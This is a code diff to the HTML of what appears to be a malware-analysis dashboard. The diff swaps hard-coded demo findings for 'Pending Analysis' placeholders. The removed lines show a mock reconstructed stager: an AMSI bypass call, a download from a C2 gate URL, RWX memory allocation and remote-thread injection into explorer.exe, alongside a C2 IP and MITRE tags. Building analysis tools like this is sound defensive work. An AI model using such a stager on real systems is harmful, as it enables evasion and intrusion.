@@ -261,21 +261,8 @@ if ($t_proc) {
 </div>
 </div>
 <!-- Cleaned Reconstructed Code Inspector -->
-<div class="bg-surface-container-lowest p-space-md font-code-sm text-code-sm leading-relaxed overflow-x-auto min-h-[290px] text-on-surface">
-<div class="text-outline-variant font-code-sm">// RECONSTRUCTED PAYLOAD - SYMBOL RESOLUTION ACTIVE</div>
-<div class="text-outline-variant font-code-sm">// Resolved Base64 Target: cdn-updates-win.org/gate.php</div>
-<div class="py-space-2xs"></div>
-<div><span class="text-secondary-fixed">string</span> <span class="text-primary-container font-semibold">$s2_server</span> = <span class="text-tertiary-container">"https://cdn-updates-win.org/gate.php"</span>;</div>
-<div class="py-space-2xs"></div>
-<div class="text-outline-variant font-code-sm">// Patch AMSI Buffer to bypass local scan detection</div>
-<div>[AmsiPatch]::DisableMemoryHook();</div>
-<div class="py-space-2xs"></div>
-<div class="text-outline-variant font-code-sm">// Injected Payload Stager Allocation</div>
-<div><span class="text-secondary-fixed">System.Net.WebClient</span> <span class="text-primary-fixed-dim">$wc</span> = <span class="text-tertiary-fixed-dim">New-Object</span> System.Net.WebClient;</div>
-<div><span class="text-secondary-fixed">byte[]</span> <span class="text-on-surface-variant">$stagerPayload</span> = <span class="text-primary-fixed-dim">$wc</span>.DownloadData(<span class="text-primary-container font-semibold">$s2_server</span>);</div>
-<div class="py-space-2xs"></div>
-<div><span class="text-secondary-fixed">IntPtr</span> <span class="text-on-surface-variant">$remoteBaseAddr</span> = <span class="text-tertiary-fixed-dim font-semibold">VirtualAlloc</span>(IntPtr.Zero, <span class="text-on-surface-variant">$stagerPayload</span>.Length, <span class="text-secondary-container text-on-secondary-container px-space-2xs py-space-2xs rounded">MEM_COMMIT | MEM_RESERVE</span>, <span class="text-error font-semibold">PAGE_EXECUTE_READWRITE</span>);</div>
-<div><span class="text-tertiary-fixed-dim font-semibold">CreateRemoteThread</span>(hTargetProcess: <span class="text-primary-container font-semibold">"explorer.exe"</span>, lpStartAddress: <span class="text-on-surface-variant">$remoteBaseAddr</span>);</div>
+<div class="bg-surface-container-lowest p-space-md font-code-sm text-code-sm leading-relaxed overflow-x-auto min-h-[290px] text-on-surface flex items-center justify-center">
+<div class="text-on-surface-variant italic text-center">No data available. Please paste a payload and click 'De-obfuscate AST' to begin analysis.</div>
 </div>
 </div>
 <!-- Compact Context & Forensic Intelligence Drawer -->
@@ -292,29 +279,22 @@ if ($t_proc) {
 <div class="bg-surface-container p-space-sm rounded flex flex-col gap-space-xs">
 <span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase">C2 Gate Endpoint</span>
 <div class="flex items-center gap-space-xs">
-<span class="material-symbols-outlined text-error text-[16px]">public_off</span>
-<span class="font-code-sm text-code-sm text-primary font-semibold truncate">cdn-updates-win.org</span>
+<span class="font-code-sm text-code-sm text-outline font-semibold truncate">Pending Analysis...</span>
 </div>
-<span class="font-code-sm text-[10px] text-outline truncate">IP: 194.26.29.112 (AS202425)</span>
 </div>
 <!-- Target Process -->
 <div class="bg-surface-container p-space-sm rounded flex flex-col gap-space-xs">
 <span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase">Injection Vector</span>
 <div class="flex items-center gap-space-xs">
-<span class="material-symbols-outlined text-tertiary-fixed-dim text-[16px]">memory</span>
-<span class="font-code-sm text-code-sm text-on-surface">explorer.exe</span>
+<span class="font-code-sm text-code-sm text-outline truncate">Pending Analysis...</span>
 </div>
-<span class="font-code-sm text-[10px] text-outline">Technique: Remote Thread Hijack</span>
 </div>
 <!-- MITRE Matrix Tags -->
 <div class="bg-surface-container p-space-sm rounded flex flex-col gap-space-xs">
 <span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase">MITRE ATT&amp;CK</span>
-<div class="flex flex-wrap gap-space-2xs">
-<span class="px-space-xs py-space-2xs bg-surface-container-high text-primary font-telemetry-micro text-telemetry-micro rounded">T1059.001</span>
-<span class="px-space-xs py-space-2xs bg-surface-container-high text-primary font-telemetry-micro text-telemetry-micro rounded">T1027</span>
-<span class="px-space-xs py-space-2xs bg-surface-container-high text-primary font-telemetry-micro text-telemetry-micro rounded">T1105</span>
+<div class="flex items-center gap-space-xs">
+<span class="font-code-sm text-code-sm text-outline truncate">Pending Analysis...</span>
 </div>
-<span class="font-code-sm text-[10px] text-outline">Execution · Defense Evasion</span>
 </div>
 </div>
 <!-- Immediate Triage & Containment Action Bar -->
